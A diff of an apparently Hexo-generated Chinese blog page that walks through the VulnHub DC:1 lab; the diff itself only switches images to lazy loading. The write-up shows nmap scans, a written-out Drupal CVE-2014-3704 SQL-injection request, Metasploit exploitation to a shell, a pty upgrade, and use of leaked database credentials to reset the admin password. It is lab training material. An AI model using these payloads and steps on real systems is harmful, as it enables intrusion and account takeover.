@@ -53,7 +53,7 @@ var CONFIG = {
   fancybox: false,
   zoomImage: {"gapAside":"20px"},
   galleryWaterfall: undefined,
-  lazyload: false,
+  lazyload: true,
   pjax: {"avoidBanner":true},
   externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
   shortcuts: undefined,
@@ -80,25 +80,43 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
         <h2 id="2-1：情报收集-威胁建模"   >
           <a href="#2-1：情报收集-威胁建模" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1：情报收集-威胁建模" class="headerlink" title="2.1：情报收集 &amp; 威胁建模"></a>2.1：情报收集 &amp; 威胁建模</h2>
       <p><strong>主机发现</strong>：<br><code>nmap -sn 192.168.8.0/24</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/7de52147067b4e3fba05f10e77c91529.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/7de52147067b4e3fba05f10e77c91529.png"  alt="在这里插入图片描述">
+      </p>
 <p>确定目标 IP 为 192.168.8.132。</p>
 <p><strong>进行端口扫描、服务探测、操作系统探测</strong>：<br><code>nmap -p- -sV -sC -O 192.168.8.132</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/619ea755a7954eeeb933b9b02a0d356e.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/619ea755a7954eeeb933b9b02a0d356e.png"  alt="在这里插入图片描述">
+      </p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.8.132</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          35249/tcp   status</span><br><span class="line">|   100024  1          42703/udp6  status</span><br><span class="line">|   100024  1          43760/udp   status</span><br><span class="line">|_  100024  1          45642/tcp6  status</span><br><span class="line">35249/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:58:12:58 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.38 seconds</span><br></pre></td></tr></table></div></figure>
 
 <p><strong>用 nmap 的漏洞库对端口进行扫描</strong>：<br><code>nmap --script=vuln -p 22,80,111,35249 192.168.8.132</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/85e3d6f2d6004803a093775ad015b2a0.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/85e3d6f2d6004803a093775ad015b2a0.png"  alt="在这里插入图片描述">
+      </p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.8.132</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.8.132</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user/password</span><br><span class="line">|     Form id: user-pass</span><br><span class="line">|     Form action: /user/password</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/node?destination=node</span><br><span class="line">|     Form id: user-login-form</span><br><span class="line">|     Form action: /node?destination=node</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user/register</span><br><span class="line">|     Form id: user-register-form</span><br><span class="line">|     Form action: /user/register</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user/</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|     Form action: /user/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.8.132:80/user</span><br><span class="line">|     Form id: user-login</span><br><span class="line">|_    Form action: /user</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-vuln-cve2014-3704: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Drupal - pre Auth SQL Injection Vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2014-3704</span><br><span class="line">|         The expandArguments function in the database abstraction API in</span><br><span class="line">|         Drupal core 7.x before 7.32 does not properly construct prepared</span><br><span class="line">|         statements, which allows remote attackers to conduct SQL injection</span><br><span class="line">|         attacks via an array containing crafted keys.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2014-10-15</span><br><span class="line">|     References:</span><br><span class="line">|       http://www.securityfocus.com/bid/70595</span><br><span class="line">|       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704</span><br><span class="line">|_      https://www.drupal.org/SA-CORE-2014-005</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /rss.xml: RSS or Atom feed</span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /UPGRADE.txt: Drupal file</span><br><span class="line">|   /INSTALL.txt: Drupal file</span><br><span class="line">|   /INSTALL.mysql.txt: Drupal file</span><br><span class="line">|   /INSTALL.pgsql.txt: Drupal file</span><br><span class="line">|   /: Drupal version 7 </span><br><span class="line">|   /README: Interesting, a readme.</span><br><span class="line">|   /README.txt: Interesting, a readme.</span><br><span class="line">|   /0/: Potentially interesting folder</span><br><span class="line">|_  /user/: Potentially interesting folder</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">35249/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:58:12:58 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 148.71 seconds</span><br></pre></td></tr></table></div></figure>
 
 <p>可以发现 80 端口的 HTTP 服务漏洞有：CSRF、CVE 2014-3704。</p>
 <p>web 页面如下：</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/ba59bee5b8f0436e9c7c16526240cc0b.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/ba59bee5b8f0436e9c7c16526240cc0b.png"  alt="在这里插入图片描述">
+      </p>
 <p>该网站能注册新用户但密码未知。</p>
 <p>既然有 HTTP 服务，那就扫描一下网站。</p>
 <p><strong>扫描网站根目录指纹信息</strong>：<br><code>whatweb http://192.168.8.132/</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/7c24a082ed754937927c24e63248b3c3.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/7c24a082ed754937927c24e63248b3c3.png"  alt="在这里插入图片描述">
+      </p>
 <p><strong>扫描网站目录</strong>：<br><code>dirsearch -u http://192.168.8.132/</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/e1ac059379f5488199ff085d948fa965.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/e1ac059379f5488199ff085d948fa965.png"  alt="在这里插入图片描述">
+      </p>
 <p>没有发现比较有趣的目录。</p>
 <p>那就尝试使用 CVE 2014-3704 漏洞作为切入点吧。</p>
 
@@ -109,43 +127,79 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <p>《Vulhub之“Drupalgeddon” SQL注入漏洞（CVE-2014-3704）》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/104620273" >https://blog.csdn.net/angry_program&#x2F;article&#x2F;details&#x2F;104620273</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 </blockquote>
 <p>登录点抓包，添加 payload</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/d382509d35c1419c8e934d316d9f2ef3.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/d382509d35c1419c8e934d316d9f2ef3.png"  alt="在这里插入图片描述">
+      </p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?q=node&amp;destination=node HTTP/1.1</span><br><span class="line">Host: 192.168.8.132</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line">Origin: http://192.168.8.132</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.8.132/</span><br><span class="line">Cookie: has_js=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name[0 or updatexml(0,concat(0x7e,database(),0x7e),0)%23]=bob&amp;name[0]=a&amp;pass=bug&amp;form_build_id=form-hUM-lGJvIc5NEmlo46nu_0Z7cOfyfmk6BQjvIRD4goA&amp;form_id=user_login_block&amp;op=Log in</span><br></pre></td></tr></table></div></figure>
 
 <p>爆出数据库。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/ffea9bb71a9c455cb57267f60e5dc0b2.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/ffea9bb71a9c455cb57267f60e5dc0b2.png"  alt="在这里插入图片描述">
+      </p>
 <p>将刚才的数据包保存，丢给 SQLmap。</p>
 <p><strong>sqlmap 探测</strong>：<br><code>sqlmap -r /root/Desktop/sql.txt --batch</code></p>
 <p>不过 sqlmap 并没有跑出结果。</p>
 <p>那就使用 metasploit 查找相关利用方法。</p>
 <p><strong>启动 msf</strong>：<br><code>msfdb init &amp;&amp; msfconsole</code></p>
 <p><strong>查找 CVE 2014-3704 漏洞相关利用模块</strong>：<br><code>search 2014-3704</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/49ffef78d3fb458dbf13d413704f2abd.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/49ffef78d3fb458dbf13d413704f2abd.png"  alt="在这里插入图片描述">
+      </p>
 <p>只有一个，那就尝试使用一下。</p>
 <p><strong>使用模块</strong>：<br><code>use 0</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/0474d201250f42a9a72ec0c4e05bff87.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/0474d201250f42a9a72ec0c4e05bff87.png"  alt="在这里插入图片描述">
+      </p>
 <p><strong>查看参数</strong>：</p>
 <p><code>show options</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/51761891247b43869ab87a7c8af1501c.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/51761891247b43869ab87a7c8af1501c.png"  alt="在这里插入图片描述">
+      </p>
 <p><strong>配置参数</strong>：<br><code>set rhosts 192.168.8.132</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/24acd0e5f5d14619b3c8840c5378e20f.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/24acd0e5f5d14619b3c8840c5378e20f.png"  alt="在这里插入图片描述">
+      </p>
 <p><strong>利用，获取会话</strong>：<br><code>run</code></p>
 <p><strong>获取目标 shell</strong>：<br><code>shell</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/5cd6bfb96ff24972ba57671ffac03d35.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/5cd6bfb96ff24972ba57671ffac03d35.png"  alt="在这里插入图片描述">
+      </p>
 <p>查看当前目录，可以看到一个 flag 文件。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/56fd787dfb41463e8c7ed5f3d185e08f.png" alt="在这里插入图片描述"></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/57cb2a7465d64ffba93d8cc0cc22acaa.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/56fd787dfb41463e8c7ed5f3d185e08f.png"  alt="在这里插入图片描述">
+      </p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/57cb2a7465d64ffba93d8cc0cc22acaa.png"  alt="在这里插入图片描述">
+      </p>
 <p>提示查看 CMS 的配置文件。drupal CMS 的配置文件在 <font style="background:#70AD47">.&#x2F;sites&#x2F;default&#x2F;</font> 目录下。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/00c41a0d5d9b478990891146014e933a.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/00c41a0d5d9b478990891146014e933a.png"  alt="在这里插入图片描述">
+      </p>
 <p>在 <font style="background:#70AD47">settings.php</font> 文件中找到以下关键信息（flag2 与 mysql 数据库认证信息）：</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/29e0fb2f4292428d934125233ee6763e.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/29e0fb2f4292428d934125233ee6763e.png"  alt="在这里插入图片描述">
+      </p>
 <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren&#x27;t the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$databases</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>
 
 <p>当前 msf 提供的 shell 并不支持交互操作，可以使用 python 获取可交互式 shell。</p>
 <p><strong>获取可交互式 shell</strong>：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&quot;</code></p>
 <p>然后登录数据库看看。</p>
 <p><code>mysql -udbuser -pR0ck3t</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/3b7268fc7f7b4326b56d1ca34b5292d4.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/3b7268fc7f7b4326b56d1ca34b5292d4.png"  alt="在这里插入图片描述">
+      </p>
 <p>之后就是一通信息搜集。</p>
 <p>在 drupaldb.users 表中可以发现以下信息。可惜密码是加了密的。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">select * from users;                                                                                                          </span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+  </span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |  </span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+  </span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |  </span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |  </span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></div></figure>
@@ -158,9 +212,15 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 </blockquote>
 <p>这里先放一放，继续搜集一下信息。在 <font style="background:#70AD47">&#x2F;etc&#x2F;passwd</font> 文件中可以发现一个 flag4 用户。</p>
 <p><code>cat -n /etc/passwd</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/92aa1cb858764bc295b79a5e05a87fef.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/92aa1cb858764bc295b79a5e05a87fef.png"  alt="在这里插入图片描述">
+      </p>
 <p>可以直接进入其 home 目录获取 flag4。</p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/7a7ebe2b14c247a2ba57dd791af03dc2.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/7a7ebe2b14c247a2ba57dd791af03dc2.png"  alt="在这里插入图片描述">
+      </p>
 <blockquote>
 <p>这里也可以使用 hydra + john 破解 flag4 用户的 ssh 连接密码，从而登录到 flag4 用户的账户，直接查看 flag4。具体参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48991458/article/details/121362982" >https://blog.csdn.net/weixin_48991458&#x2F;article&#x2F;details&#x2F;121362982</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 </blockquote>
@@ -168,23 +228,38 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></he
 <p>现在再回头利用刚才的数据库。</p>
 <p>直接利用加密脚本 <font style="background:#70AD47">&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</font> 获取密码密文。</p>
 <p><code>php /var/www/scripts/password-hash.sh adminpass</code></p>
-<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/4eb877594d2640f080a07a002b7fc027.png" alt="在这里插入图片描述"></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnHub/DC%EF%BC%9A1/4eb877594d2640f080a07a002b7fc027.png"  alt="在这里插入图片描述">
+      </p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password: adminpass</span><br><span class="line">hash: $S$DUKfIRZztxmhlJ9B3U8br8nSw3XMp0ZCJw2j.b5AUpjbUfLvupWN</span><br></pre></td></tr></table></div></figure>
 
 <p>登录到 mysql，直接更改 drupaldb.users 表中 admin 用户的密码：</p>
 <p><code>mysql -udbuser -pR0ck3t</code></p>
